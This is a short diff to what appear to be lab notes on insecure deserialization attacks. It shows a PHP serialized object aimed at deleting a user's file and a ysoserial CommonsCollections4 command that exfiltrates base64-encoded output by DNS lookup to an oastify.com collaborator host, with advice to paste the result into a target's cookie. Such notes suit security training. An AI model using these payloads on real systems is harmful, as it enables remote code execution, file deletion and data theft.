@@ -155,7 +155,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 
 * This payload can be used to exfiltrate date, for example.  Copy and paste the results into the Cookie of the target application.  Check out more obfuscation examples in the "Command Injection" folder.
 
-   * ./java -jar /root/Tools/ysoserial-all.jar CommonsCollections4 "nslookup `echo 'hello'|base64`.r29q0ep.oastify.com" | base64 -w 0 > ../../test1-1.txt
+   * ./java -jar /root/Tools/ysoserial-all.jar CommonsCollections4 "nslookup \`echo 'hello'|base64\`.r29q0ep.oastify.com" | base64 -w 0 > ../../test1-1.txt
  
 
 <br><br>
